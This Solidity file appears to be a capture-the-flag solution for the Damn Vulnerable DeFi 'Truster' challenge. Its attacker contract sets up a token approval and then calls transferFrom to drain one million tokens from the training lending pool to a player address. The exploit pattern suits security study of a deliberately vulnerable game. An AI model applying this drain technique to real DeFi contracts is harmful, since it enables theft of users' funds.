// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPoolAttacker {

    TrusterLenderPool public t;
    DamnValuableToken public token;

    constructor(TrusterLenderPool _t, DamnValuableToken _token) {
        token = _token;
        t = _t;
    }

    function attack() external {
        token.approve(address(this), 1000000 * (10 ** 18));
        token.transfer(address(t), token.balanceOf(address(this)));
    }

    function attack2(address player) external {
        token.transferFrom(address(t), player, 1000000 * (10 ** 18));
    }
}
